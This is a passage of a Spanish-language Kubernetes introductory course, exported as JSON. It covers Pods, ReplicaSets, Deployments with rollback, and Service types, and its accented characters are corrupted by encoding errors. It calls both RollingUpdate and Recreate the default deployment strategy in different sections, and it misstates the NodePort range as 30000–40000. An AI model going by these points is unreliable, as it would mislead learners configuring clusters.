haga el correspondiente proceso dentro del contenedor. Algunos ejemplos pueden ser: ejecuci√≥n en modo demonio de un servidor web, ejecuci√≥n de un servidor de aplicaciones Java, ejecuci√≥n de una tarea programada, ejecuci√≥n en modo demonio de un servidor DNS, etc.\n\nPod multicontenedor\nEn algunos casos la ejecuci√≥n de un solo proceso por contenedor no es la soluci√≥n ideal, ya que existen procesos fuertemente acoplados que no pueden comunicarse entre s√≠ f√°cilmente si se ejecutan en diferentes sistemas, por lo que la soluci√≥n planteada en esos casos es definir un Pod multicontenedor y ejecutar cada proceso en un contenedor, pero que puedan comunicarse entre s√≠ como si lo estuvieran haciendo en el mismo sistema, utilizando un dispositivo de almacenamiento compartido si hiciese falta (para leer, escribir ficheros entre ellos) y compartiendo externamente una misma direcci√≥n IP. Un ejemplo t√≠pico de un Pod multicontenedor es un servidor web nginx con un servidor de aplicaciones PHP-FPM, que se implementar√≠a mediante un solo Pod, pero ejecutando un proceso de nginx en un contenedor y otro proceso de php-fpm en otro contenedor.\nAl tratarse este curso de un curso de introducci√≥n a Kubernetes no vamos a poder ver todas las cargas de trabajo, ni la ejecuci√≥n y despliegue de todo tipo de aplicaciones, por lo que consideramos m√°s razonable no utilizar ejemplos de Pods multicontenedor y centrarnos en la comprensi√≥n de las caracter√≠sticas principales de Kubernetes mediante ejemplos sencillos, comunes y muy apropiados para ejecutarse en Kubernetes, mediante en uso de Pods con un solo contenedor."},"Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.1-describiendo-un-pod":{"title":"3.1-describiendo-un-pod","links":[],"tags":[],"content":"3.1 Describiendo un pod\nEs posible crear un Pod directamente (lo que se denomina utilizaci√≥n imperativa) mediante kubectl:\nkubectl run pod-nginx --image=nginx\n\nDe esta forma se crea un Pod con un contenedor que utiliza la imagen nginx:latest (no hemos especificado una versi√≥n) del registro que est√© definido por defecto en el cluster de Kubernetes, se asigna una direcci√≥n IP y se lanza en uno de los nodos del cluster.\nUn Pod tiene otros muchos par√°metros asociados, que en este caso quedar√°n sin definir o Kubernetes asumir√° los valores por defecto. Sin embargo es mucho m√°s habitual trabajar con los objetos de Kubernetes de manera declarativa, definiendo los objetos de forma detallada a trav√©s de un fichero en formato YAML. De esta forma tenemos un fichero con la definici√≥n del objeto que hemos lanzado y podemos utilizar en otro momento exactamente la misma definici√≥n o podemos ir modific√°ndola y aplicando los cambios cuando sea conveniente.\nUn ejemplo podr√≠a ser el contenido del fichero pod.yaml:\napiVersion: v1 # required\nkind: Pod # required\nmetadata: # required\n name: pod-nginx # required\n labels:\n   app: nginx\n   service: web\nspec: # required\n containers:\n   - image: nginx:1.16\n     name: contenedor-nginx\n     imagePullPolicy: Always\n\nVeamos cada uno de los par√°metros que hemos definido:\n\napiVersion: v1: La versi√≥n de la API que vamos a usar.\nkind: Pod: La clase de recurso que estamos definiendo.\nmetadata: Informaci√≥n que nos permite identificar un√≠vocamente el recurso:\n\nname: Nombre del pod\nlabels: Las Labels nos permiten etiquetar los recursos de Kubernetes (por ejemplo un pod) con informaci√≥n del tipo clave/valor.\n\n\nspec: Definimos las caracter√≠sticas del recurso. En el caso de un Pod indicamos los contenedores que van a formar el Pod (secci√≥n containers), en este caso s√≥lo uno.\n\nimage: La imagen desde la que se va a crear el contenedor\nname: Nombre del contenedor.\nimagePullPolicy: Las im√°genes se guardan en un registro interno. Se pueden utilizar registros p√∫blicos (google o docker hub son los m√°s usados) y registros privados. La pol√≠tica por defecto es IfNotPresent, que se baja la imagen si no est√° en el registro interno. Si queremos forzar la descarga desde el repositorio externo, tendremos que indicar imagePullPolicy:Always.\n\n\n"},"Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.2-gestionando-los-pods":{"title":"3.2-gestionando-los-pods","links":[],"tags":[],"content":"3.2 Gestionando los pods\nTenemos un fichero pod.yaml, donde hemos definido un Pod de la siguiente manera:\napiVersion: v1\nkind: Pod\nmetadata:\n name: pod-nginx\n labels:\n   app: nginx\n   service: web\nspec:\n containers:\n   - image: nginx:1.16\n     name: contenedor-nginx\n     imagePullPolicy: Always\n\nPodemos crear directamente el Pod desde el fichero yaml:\nkubectl create -f pod.yaml\n\nY podemos ver el estado en el que se encuentra y si est√° o no listo:\nkubectl get pods\n\n(Ser√≠a equivalente usar po, pod o pods).\nSi queremos ver m√°s informaci√≥n sobre los Pods, como por ejemplo, saber en qu√© nodo del cluster se est√° ejecutando:\nkubectl get pod -o wide\n\nPara obtener informaci√≥n m√°s detallada del Pod (equivalente al inspect de docker):\nkubectl describe pod pod-nginx\n\nPodr√≠amos editar el Pod y ver todos los atributos que definen el objeto, la mayor√≠a de ellos con valores asignados autom√°ticamente por el propio Kubernetes y podremos actualizar ciertos valores:\nkubectl edit pod pod-nginx\n\nSin embargo, es una opci√≥n compleja para utilizarla a estas alturas del curso y hay que comprender mejor c√≥mo funcionan los objetos de Kubernetes para poder hacer modificaciones de forma apropiada, y adem√°s, veremos m√°s adelante otra manera m√°s correcta de actualizar un objeto de Kubernetes.\nNormalmente no se interact√∫a directamente con el Pod a trav√©s de una shell, pero s√≠ se obtienen directamente los logs al igual que se hace en docker:\nkubectl logs pod-nginx\n\nEn el caso poco habitual de que queramos ejecutar alguna orden adicional en el Pod, podemos utilizar el comando exec, por ejemplo, en el caso particular de que queremos abrir una shell de forma interactiva:\nkubectl exec -it pod-nginx -- /bin/bash\n\nPodemos acceder a la aplicaci√≥n, redirigiendo un puerto de localhost al puerto de la aplicaci√≥n:\nkubectl port-forward pod-nginx 8080:80\n\nY accedemos al servidor web en la url http://localhost:8080.\nNOTA: Esta no es la forma con la que accedemos a las aplicaciones en Kubernetes. Para el acceso a las aplicaciones usaremos un recurso llamado Service. Con la anterior instrucci√≥n lo que estamos haciendo es una redirecci√≥n desde localhost el puerto 8080 al puerto 80 del Pod y es √∫til para peque√±as pruebas de funcionamiento, nunca para acceso real a un servicio. NOTA2: El port-forward no es igual a la redirecci√≥n de puertos de docker, ya que en este caso la redirecci√≥n de puertos se hace en el equipo que ejecuta kubectl, no en el equipo que ejecuta los Pods o los contenedores.\nPara obtener las etiquetas de los Pods que hemos creado:\nkubectl get pods --show-labels\n\nLas etiquetas las hemos definido en la secci√≥n metadata del fichero yaml, pero tambi√©n podemos a√±adirlos a los Pods ya creados:\nkubectl label pods pod-nginx service=web --overwrite=true\n\nLas etiquetas son muy √∫tiles, ya que permiten seleccionar un recurso determinado (en un cluster de Kubernetes puede haber cientos o miles de objetos).Por ejemplo para visualizar los Pods que tienen una etiqueta con un determinado valor:\nkubectl get pods -l service=web\n\nTambi√©n podemos visualizar los valores de las etiquetas como una nueva columna:\nkubectl get pods -Lservice\n\nY por √∫ltimo, eliminamos el Pod mediante:\nkubectl delete pod pod-nginx\n"},"Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.0-tolerancia-y-escalabilidad":{"title":"4.0-tolerancia-y-escalabilidad","links":[],"tags":[],"content":"4. Tolerancia y escalabilidad: ReplicaSets\nReplicaSet es un recurso de Kubernetes que asegura que siempre se ejecuta un n√∫mero de r√©plicas concreto de un Pod determinado. Por lo tanto, nos garantiza que un conjunto de Pods siempre est√°n funcionando y disponibles proporcion√°ndonos las siguientes caracter√≠sticas: Tolerancia a fallos y Escalabilidad din√°mica.\nAunque en el m√≥dulo anterior estudiamos como gestionar el ciclo de vida de los Pods, en Kubernetes no vamos a trabajar directamente con Pods. Un recurso ReplicaSet controla un conjunto de Pods y es el responsable de que estos Pods siempre est√©n ejecut√°ndose (Tolerancia a fallos) y de aumentar o disminuir las r√©plicas de dicho Pod (Escalabilidad din√°mica). Estas r√©plicas de los Pods se ejecutar√°n en nodos distintos del cluster, aunque en nuestro caso al utilizar minikube, un cluster de un solo nodo, no vamos a poder apreciar como se reparte la ejecuci√≥n de los Pods en varios nodos, todos los Pods se ejecutar√°n en la misma m√°quina.\nEl ReplicaSet va a hacer todo lo posible para que el conjunto de Pods que controla siempre se est√©n ejecutando. Por ejemplo: si el nodo del cluster donde se est√°n ejecutando una serie de Pods se apaga, el ReplicaSet crear√≠a nuevos Pods en otro nodo para tener siempre ejecutando el n√∫mero que hemos indicado. Si un Pod se para por cualquier problema, el ReplicaSet intentar√° que vuelva a ejecutarse para que siempre tengamos el n√∫mero de Pods deseado."},"Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.1-describiendo-un-replicaset":{"title":"4.1-describiendo-un-replicaset","links":[],"tags":[],"content":"4.1 Describiendo un ReplicaSet\nEn este caso tambi√©n vamos a definir el recurso de ReplicaSet en un fichero nginx-rs.yaml, por ejemplo como este:\napiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: replicaset-nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n        - image: nginx\n          name: contenedor-nginx\n\nAlgunos de los par√°metros definidos ya lo hemos estudiado en la definici√≥n del Pod. Los nuevos par√°metros de este recurso son los siguientes:\n\nreplicas: Indicamos el n√∫mero de Pods que siempre se deben estar ejecutando.\nselector: Seleccionamos los Pods que va a controlar el ReplicaSet por medio de las etiquetas. Es decir este ReplicaSet controla los Pods cuya etiqueta app es igual a nginx.\ntemplate: El recurso ReplicaSet contiene la definici√≥n de un Pod. F√≠jate que el Pod que hemos definido en la secci√≥n template tiene indicado la etiqueta necesaria para que sea seleccionado por el ReplicaSet (app: nginx).\n"},"Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.2-gestionando-los-replicaset":{"title":"4.2-gestionando-los-replicaset","links":[],"tags":[],"content":"4.2 Gestionando los ReplicaSet\nCreaci√≥n del ReplicaSet\nAunque en la unidad anterior usamos kubectl create para crear los recursos de nuestro cluster, es recomendable usar kubectl apply. La diferencia es la forma en la que actuamos sobre el cluster:\n\n\nConfiguraci√≥n imperativa de objetos: La definici√≥n del objeto est√° guardada en un fichero Yaml y ejecutamos un comando imperativo. Posteriormente no podremos modificar el objeto, habr√° que borrarlo y crearlo de nuevo. Ejemplos:\n  kubectl create -f recurso.yaml\n  kubectl delete -f recurso.yaml\n\n\n\nConfiguraci√≥n declarativa de objetos: No se definen las acciones a realizar. Cuando se aplica la configuraci√≥n del objeto estamos indicando un estado deseado al que queremos llegar. Posteriormente si la definici√≥n cambia, podremos cambiar el objeto. Recomendado en producci√≥n. Ejemplo:\n  kubectl apply -f recurso.yaml\n\n\n\nPor lo tanto para crear nuestro ReplicaSet, ejecutamos:\nkubectl apply -f nginx-rs.yaml\n\nY podemos ver los recursos que se han creado con:\nkubectl get rs,pods\n\nObservamos que quer√≠amos crear 2 replicas del Pod, y efectivamente se han creado.\nSi queremos obtener informaci√≥n detallada del recurso ReplicaSet que hemos creado:\nkubectl describe rs replicaset-nginx\n\n\nTolerancia a fallos\nY ahora comenzamos con las funcionalidades llamativas de Kubernetes. ¬øQu√© pasar√≠a si borro uno de los Pods que se han creado? Inmediatamente se crear√° uno nuevo para que siempre est√©n ejecut√°ndose los Pods deseados, en este caso 2:\nkubectl delete pod &lt;nombre_del_pod&gt;\nkubectl get pods\n\n\nEscalabilidad\nPara escalar el n√∫mero de pods:\nkubectl scale rs replicaset-nginx --replicas=5\nkubectl get pods\n\nOtra forma de hacerlo ser√≠a cambiando el par√°metro replicas de fichero yaml, y volviendo a ejecutar:\nkubectl apply -f nginx-rs.yaml\n\nLa escalabilidad puede ser para aumentar el n√∫mero de Pods o para reducirla:\nkubectl scale rs replicaset-nginx --replicas=1\n\n\nEliminando el ReplicaSet\nPor √∫ltimo, si borramos un ReplicaSet se borrar√°n todos los Pods asociados:\nkubectl delete rs replicaset-nginx\n\nOtra forma de borrar el recurso, es utilizar el fichero yaml:\nkubectl delete -f nginx-rs.yaml\n"},"Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.0-deployments":{"title":"5.0-deployments","links":[],"tags":[],"content":"5. Despliegues: Deployments\nEl despliegue o Deployment es la unidad de m√°s alto nivel que podemos gestionar en Kubernetes.\nEn los m√≥dulos anteriores hemos estudiado los Pods y los ReplicaSet, sin embargo, cuando queramos desplegar una aplicaci√≥n en Kubernetes no vamos a gestionar √©stos directamente, sino que vamos a crear un recurso de tipo Deployment. ¬øQu√© ocurre cuando creamos un nuevo recurso Deployment?\n\nLa creaci√≥n de un Deployment conlleva la creaci√≥n de un ReplicaSet que controlar√° un conjunto de Pods creados a partir de la versi√≥n de la imagen que se ha indicado.\nSi hemos desarrollado una nueva versi√≥n de la aplicaci√≥n y hemos creado una nueva imagen con la nueva versi√≥n, podemos modificar el Deployment indicando la nueva versi√≥n de la imagen. En ese momento se crear√° un nuevo ReplicaSet que controlar√° un nuevo conjunto de Pods creados a partir de la nueva versi√≥n de la imagen (habremos desplegado una nueva versi√≥n de la aplicaci√≥n).\nPor lo tanto podemos decir que un Deployment va guardando un historial con los ReplicaSet que se van creando al ir cambiado la versi√≥n de la imagen. El ReplicaSet que est√© activo en un determinado momento ser√° el responsable de crear los Pods con la versi√≥n actual de la aplicaci√≥n.\nSi tenemos un historial de ReplicaSet seg√∫n las distintas versiones de la imagen que estamos utilizando, podemos, de una manera sencilla, volver a una versi√≥n anterior de la aplicaci√≥n (Rollback).\n\nPor la manera de trabajar de un Deployment, podemos indicar las funciones que nos aporta:\n\nControl de r√©plicas\nEscalabilidad de pods\nActualizaciones continuas\nDespliegues autom√°ticos\nRollback a versiones anteriores\n\n\nArquitectura de nuestras aplicaciones\nTenemos dos clases de aplicaciones que podemos desplegar en un cluster de Kubernetes:\n\nAplicaciones que necesitan varios servicios para ejecutarse: por ejemplo una aplicaci√≥n escrita en PHP y servida por un servidor web que necesita un servidor de base de datos para guardar la informaci√≥n. En este caso crearemos dos recursos Deployment: uno para desplegar la aplicaci√≥n PHP y otro para desplegar la base de datos. Por cada servicio que necesite nuestra aplicaci√≥n crearemos un Deployment para desplegarlo.\nAplicaciones construidas con microservicios: cada microservicio se puede desplegar de manera aut√≥noma. Por cada microservicio que forma parte de la aplicaci√≥n crearemos un recurso Deployment. Por ejemplo, una aplicaci√≥n que tenga un frontend para ofrecer la informaci√≥n y que haga llamadas a un backend que ofrece un servicio web por medio de una API RESTful.\n"},"Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.1-describiendo-un-deployment":{"title":"5.1-describiendo-un-deployment","links":[],"tags":[],"content":"5.1 Describiendo un deployment\nPodemos crear un Deployment de forma imperativa utilizando un comando como el siguiente (se podr√≠an indicar muchos m√°s par√°metros de configuraci√≥n que podemos consultar en la documentaci√≥n):\nkubectl create deployment nginx --image nginx\n\nNosotros, sin embargo, vamos a seguir describiendo los recursos en un fichero yaml. En este caso para describir un Deployment de nginx podemos escribir un fichero nginx-deployment.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-nginx\n  labels:\n    app: nginx\nspec:\n  revisionHistoryLimit: 2\n  strategy:\n    type: RollingUpdate\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: contendor-nginx\n        ports:\n        - name: http\n          containerPort: 80\n\nLa creaci√≥n de un Deployment crea un ReplicaSet y los Pods correspondientes. Por lo tanto en la definici√≥n de un Deployment se define tambi√©n el ReplicaSet asociado (los par√°metros replicas, selector y template). Los atributos relacionados con el Deployment que hemos indicado en la definici√≥n son:\n\nrevisionHistoryLimit: Indicamos cu√°ntos ReplicaSets antiguos deseamos conservar, para poder realizar rollback a estados anteriores. Por defecto, es 10.\nstrategy: Indica el modo en que se realiza una actualizaci√≥n del Deployment. Es decir, cuando modificamos la versi√≥n de la imagen del Deployment, se crea un ReplicaSet nuevo y ¬øqu√© hacemos con los pods?:\n\nRecreate: elimina los Pods antiguos y crea los nuevos.\nRollingUpdate: va creando los nuevos Pods, comprueba que funcionan y se eliminan los antiguos; es la opci√≥n por defecto.\n\n\n\nAdem√°s, hemos introducido un nuevo par√°metro al definir el contenedor del pod: con el par√°metro ports hemos indicado el puerto que expone el contenedor (containerPort) y le hemos asignado un nombre (name)."},"Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.2-gestion-basica-de-un-deployment":{"title":"5.2-gestion-basica-de-un-deployment","links":[],"tags":[],"content":"5.2 Gesti√≥n b√°sica de un deployment\nCreaci√≥n del Deployment\nCuando creamos un Deployment, se crear√° un ReplicaSet asociado, que crear√° y controlar√° los Pods que hayamos indicado.\nkubectl apply -f nginx-deployment.yaml\nkubectl get deploy,rs,pod\n\nPara ver los recursos que hemos creado tambi√©n podemos utilizar la instrucci√≥n:\nkubectl get all\n\nEsta orden muestra los Deployments, ReplicaSets, Pods y Services que tenemos creados en el cluster. Los Services lo estudiaremos en el siguiente m√≥dulo.\n\nEscalado de los Deployments\nComo ocurr√≠a con los ReplicaSets los Deployment tambi√©n se pueden escalar, aumentando o disminuyendo el n√∫mero de Pods asociados. Al escalar un Deployment estamos escalando el ReplicaSet asociado en ese momento:\nkubectl scale deployment deployment-nginx --replicas=4\n\n\nOtras operaciones\nSi queremos acceder a la aplicaci√≥n, podemos utilizar la opci√≥n de port-forward sobre el despliegue (de nuevo recordamos que no es la forma adecuada para acceder a un servicio que se ejecuta en un Pod, pero de momento no tenemos otra). En este caso si tenemos asociados m√°s de un Pod, la redirecci√≥n de puertos se har√° sobre un solo Pod (no habr√° balanceo de carga):\nkubectl port-forward deployment/deployment-nginx 8080:80\n\nSi queremos ver los logs generados en los Pods de un Deployment:\nkubectl logs deployment/deployment-nginx\n\nSi queremos obtener informaci√≥n detallada del recurso Deployment que hemos creado:\nkubectl describe deployment deployment-nginx\n\n\nEliminando el Deployment\nSi eliminamos el Deployment se eliminar√°n el ReplicaSet asociado y los Pods que se estaban gestionando.\nkubectl delete deployment deployment-nginx\n"},"Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.3-actualizacion-y-desactualizacion-de-un-deployment":{"title":"5.3-actualizacion-y-desactualizacion-de-un-deployment","links":[],"tags":[],"content":"5.3 Actualizaci√≥n y desactualizaci√≥n de un deployment\nCiclo de vida del desarrollo de aplicaciones‚Ä¶\nEl ciclo de vida del desarrollo de aplicaciones cuando trabajamos con contenedores nos facilita la labor de versionar nuestros desarrollos. Por cada nueva versi√≥n que se desarrolla de nuestra aplicaci√≥n podemos crear una nueva imagen del contenedor que podemos versionar utilizando la etiqueta del nombre de la imagen.\nPor lo tanto, al crear un Deployment indicaremos la imagen desde la que se van a crear los Pods. Al indicar la imagen podremos indicar la etiqueta que nos indica la versi√≥n de la aplicaci√≥n que vamos a implantar.\nUna vez que hemos creado un Deployment a partir de una imagen de una versi√≥n determinada, tenemos los Pods ejecutando la versi√≥n indicada de la aplicaci√≥n.\n¬øC√≥mo podemos actualizar a una nueva versi√≥n de la aplicaci√≥n?. Se seguir√°n los siguientes pasos:\n\nTendremos que modificar el valor del par√°metro image para indicar una nueva imagen, especificando la nueva versi√≥n mediante el cambio de etiqueta.\nEn ese momento el Deployment se actualiza, es decir, crea un nuevo ReplicaSet que crear√° nuevos Pods de la nueva versi√≥n de la aplicaci√≥n.\nSeg√∫n la estrategia de despliegue indicada, se ir√°n borrando los antiguos Pods y se crear√°n lo nuevos.\nEl Deployment guardar√° el ReplicaSet antiguo, por si en alg√∫n momento queremos volver a la versi√≥n anterior.\n\nVeamos este proceso con m√°s detalles estudiando un ejemplo de despliegue:\nDesplegando la aplicaci√≥n mediawiki\nVamos a partir del fichero mediawiki-deployment.yamlpara desplegar la aplicaci√≥n:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mediawiki\n  labels:\n    app: mediawiki\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mediawiki\n  template:\n    metadata:\n      labels:\n        app: mediawiki\n    spec:\n      containers:\n      - name: contenedor-mediawiki\n        image: mediawiki:1.38.5\n        ports:\n        - containerPort: 80\n\nSi nos fijamos vamos a desplegar la versi√≥n 1.38.5 de la aplicaci√≥n mediawiki. Creamos el despliegue con la siguiente instrucci√≥n:\nkubectl apply -f mediawiki-deployment.yaml\n\nA continuaci√≥n podemos ‚Äúanotar‚Äù en el despliegue la causa del nuevo despliegue, de esta forma al visualizar el historial de modificaciones veremos las causas que han provocado cada actualizaci√≥n. Para ello:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Primer despliegue. Desplegamos versi√≥n 1.38.5&quot;\n\nPodemos comprobar los recursos que hemos creado:\nkubectl get all\n\nY si accedemos al Pod con un port-forward comprobamos que la versi√≥n actual de la mediawiki es la 1.38.5:\nkubectl port-forward deployment/mediawiki 8080:80\n\n\n\nActualizar un Deployment\nA continuaci√≥n queremos desplegar una versi√≥n m√°s reciente de la mediawiki. Para ello tenemos que modificar el campo image de nuestro Deployment, esta operaci√≥n la podemos hacer de varias formas:\n\n\nModificando el fichero yaml y volviendo a ejecutar un kubectl apply.\n\n\nEjecutando la siguiente instrucci√≥n:\n kubectl set image deployment/mediawiki contenedor-mediawiki=mediawiki:1.39.1\n\n\n\nAl ejecutar la actualizaci√≥n del Deployment podemos observar que se ha creado un nuevo ReplicaSet, que crear√° los nuevos Pods a partir de la versi√≥n modificada de la imagen. ¬øC√≥mo se crean los nuevos Pods y se destruyen los antiguos? Depender√° de la estrategia de despliegue:\n\nPor defecto la estrategia de despliegue es Recreate que elimina los Pods antiguos y crea los nuevos.\nSi indicamos en el despliegue el tipo de estrategia RollingUpdate, se van creando los nuevos Pods, se comprueba que funcionan y se eliminan los antiguos.\n\nA continuaci√≥n indicamos el motivo del cambio del despliegue con una anotaci√≥n:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Segundo despliegue. Actualizamos a la versi√≥n 1.39.1&quot;\n\nVeamos los recursos que se han creado en la actualizaci√≥n:\nkubectl get all\n\nKubernetes utiliza el t√©rmino rollout para la gesti√≥n de diferentes versiones de despliegues. Podemos ver el historial de actualizaciones que hemos hecho sobre el despliegue:\nkubectl rollout history deployment/mediawiki\n\nY nos aparecen las anotaciones que hemos hecho de cada despliegue:\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versi√≥n 1.38.5\n2         Segundo despliegue. Actualizamos a la versi√≥n 1.39.1\n\nY volvemos a acceder a la aplicaci√≥n con un port-forward para comprobar que realmente se ha desplegado la versi√≥n 1.39.1.\n\n\nRollback del Deployment\nEl proceso de despliegue de una nueva versi√≥n de una aplicaci√≥n es una labor cr√≠tica, que tradicionalmente ha dado muchos problemas. Si estamos sirviendo una aplicaci√≥n web que utilizan muchos usuarios, no nos podemos permitir que haya un corte en el servicio por un problema en el despliegue de una nueva versi√≥n.\nEvidentemente, los problemas que pueden aparecer durante el despliegue de una nueva versi√≥n pueden estar causados por muchos motivos, y muchas veces es complicado tener todos los factores controlados. Si finalmente tenemos alguno, la pregunta ser√≠a: ¬øHemos dise√±ado un proceso que nos permita de una manera sencilla y r√°pida volver a la versi√≥n anterior de la aplicaci√≥n que sab√≠amos que funcionaba bien?\nA ese proceso de volver a una versi√≥n anterior de la aplicaci√≥n es lo que llamamos rollback, o de forma concreta en k8s, ‚Äúdeshacer‚Äù un rollout. Veremos en este ejemplo que Kubernetes nos ofrece un mecanismo sencillo de volver a versiones anteriores. Como hemos comentado, las actualizaciones de los Deployment van creando nuevos ReplicaSet, y se va guardando el historial de ReplicaSet anteriores. Deshacer un Rollout ser√° tan sencillo como activar uno de los ReplicaSet antiguos.\nAhora vamos a desplegar una versi√≥n que nos da un error (la versi√≥n 2 de la aplicaci√≥n no existe, no existe la imagen mediawiki:2). ¬øPodremos volver al despliegue anterior?\nkubectl set image deployment mediawiki contenedor-mediawiki=mediawiki:2\n\nY realizamos la anotaci√≥n:\nkubectl annotate deployment/mediawiki kubernetes.io/change-cause=&quot;Tercer despliegue. Actualizamos a la versi√≥n 2&quot;\n\nComprobamos el historial de despliegues:\nkubectl rollout history deployment/mediawiki\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versi√≥n 1.38.5\n2         Segundo despliegue. Actualizamos a la versi√≥n 1.39.1\n3         Tercer despliegue. Actualizamos a la versi√≥n 2\n\nDependiendo de la estrategia de despliegue, esto puede provocar que la aplicaci√≥n se quede en la versi√≥n anterior (RollingUpdate) o que no haya ning√∫n Pod v√°lido desplegado (Recreate). En cualquier caso, se puede volver a la versi√≥n anterior del despliegue mediante rollout:\nkubectl rollout undo deployment/mediawiki\nkubectl get all\n\nY terminamos comprobando el historial de actualizaciones:\nkubectl rollout history deployment mediawiki\ndeployment.apps/mediawiki\nREVISION  CHANGE-CAUSE\n1         Primer despliegue. Desplegamos versi√≥n 1.38.5\n3         Tercer despliegue. Actualizamos a la versi√≥n 2\n4         Segundo despliegue. Actualizamos a la versi√≥n 1.39.1\n"},"Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.0-acceso-a-las-aplicaciones":{"title":"6.0-acceso-a-las-aplicaciones","links":[],"tags":[],"content":"6. Acceso a las aplicaciones (Services)\nLos servicios (Services) nos permiten acceder a las aplicaciones que hemos desplegado en el cluster.\n\nUn Service es una abstracci√≥n que nos permite acceder a un conjunto de pods (que se han creado a partir de un Deployment) que implementan una aplicaci√≥n (Por ejemplo: acceder a un servidor web, a una servidor de base de datos, a un servicio que forma parte de una aplicaci√≥n, ‚Ä¶).\nA cada Pod se le asigna una IP a la que no se puede acceder directamente, por lo tanto necesitamos un Service que nos ofrece una direcci√≥n virtual (CLUSTER-IP) y un nombre que identifica al conjunto de Pods que representa, al cual nos podemos conectar.\nLa conexi√≥n al Service se puede realizar desde otros Pods o desde el exterior (mediante la generaci√≥n aleatoria de un puerto). Por ejemplo, si tenemos una aplicaci√≥n formada por dos Services: servidor web y servidor de base de datos, tendremos que acceder desde el exterior al servidor web, y acceder al servidor de base de datos desde el servidor web. En principio no ser√° necesario acceder al servidor de base de datos desde el exterior.\nSi el Deployment que hemos creado tiene m√°s de un Pod asociado, el Service que representa el acceso a esta aplicaci√≥n balancear√° la carga entre los Pods con una pol√≠tica Round Robin.\nEn el cluster existir√° un componente que nos ofrece un servicio DNS. Cada vez que creamos un Service se actualizar√° el DNS para resolver el nombre que hemos asignado al Service con la IP virtual (CLUSTER-IP) que se le ha asignado.\nNota Cuando tenemos m√°s de un Pod ofreciendo el mismo servicio, realmente tenemos un cl√∫ster y es importante distinguir entre servicios sin estado (stateless) o con estado (stateful)). En un servicio sin estado (por ejemplo, un servidor web que sirva contenido est√°tico), las peticiones son independientes y se pueden servir por diferentes nodos sin problema, aunque en el caso de un servidor web, deber√≠amos asegurarnos previamente de que el directorio con los datos es el mismo. Un servicio de este tipo lo podemos escalar con un despliegue sin problema. Por otra parte, si el servicio tiene estado (por ejemplo, un servidor de bases de datos), una petici√≥n puede depender de otra anterior, por lo que puede haber incoherencias si simplemente creamos un cluster de nodos iguales. En este tipo de servicios, es necesaria una configuraci√≥n adicional que controle el estado y que haga que los datos que sirve cada Pod son coherentes entre s√≠. Veremos un ejemplo de este tipo de servicios en el m√≥dulo 9 del curso.\n\nTipos de Services\nClusterIP\nSolo se permite el acceso interno a un Service de este tipo. Es decir, si tenemos un despliegue con una aplicaci√≥n a la que no es necesario acceder desde el exterior, crearemos un Service de este tipo para que otras aplicaciones puedan acceder a ella (por ejemplo, una base de datos). Es el tipo por defecto. Si deseamos seguir accediendo desde el exterior, para hacer pruebas durante la fase de desarrollo podemos seguir utilizando la instrucci√≥n kubectl port-forward.\n\nVeamos el ejemplo:\n\nNecesitamos que los Pods de Wordpress accedan al Pod del MySQL.\nLa IP que ha tomado el Pod de MySQL (172.25.3.5) es inaccesible desde los Pods de Wordpress.\nPor lo tanto hemos creado un Service de tipo ClusterIP, que ha obtenido una ip virtual (192.168.3.5) y expone el puerto de MySQL 3306.\nEsta IP s√≠ es accesible desde los Pods de Wordpress.\nAl acceder a esta IP se balancear√° la carga entre los Pods de MySQL (en el ejemplo s√≥lo tenemos uno).\nAdem√°s en el Wordpress no necesitamos configurar la IP virtual del Service que hemos creado, ya que disponemos de un servidor DNS que resuelve el nombre del Service mysql en la direcci√≥n virtual del Service (192.168.3.5). Por lo tanto en la configuraci√≥n de Wordpress pondremos el nombre mysql como host del servidor de base de datos al que debe acceder.\n\nNodePort\nAbre un puerto, para que el Service sea accesible desde el exterior. Por defecto el puerto generado est√° en el rango de 30000:40000. Para acceder usamos la ip del servidor master del cluster y el puerto asignado.\n\nVeamos el ejemplo:\n\nNecesitamos que los Pods de Wordpress sean accesibles desde el exterior, para que podamos acceder a la aplicaci√≥n.\nLa IP que han tomado los Pods de Wordpress (172.25.3.3, ‚Ä¶) no son accesibles desde el exterior. Adem√°s comprobamos que estos Pods est√°n ofreciendo el servicio en el puerto 8080.\nPor lo tanto, hemos creado un Service de tipo NodePort que ha obtenido una IP virtual (192.168.3.4) y expone el puerto 80.\nAl acceder a esta IP al puerto 80 se balancear√° la carga entre los Pods de Wordpress, accediendo a las IPs de los Pods de Wordpress al puerto 8080.\nEl Service NodePort ha asignado un puerto de acceso aleatorio (entre el 30000 - 40000) que nos permite acceder a la aplicaci√≥n mediante la IP del nodo master. En el ejemplo si accedemos a 10.0.2.4:30453 estaremos accediendo al Service que nos permitir√° acceder a la aplicaci√≥n.\n\nLoadBalancer\nEste tipo s√≥lo est√° soportado en servicios de cloud p√∫blico (GKE, AKS o AWS). El proveedor asignar√° un recurso de balanceo de carga para el acceso a los Services. Si usamos un cloud privado como OpenStack, necesitaremos un plugin para configurar el 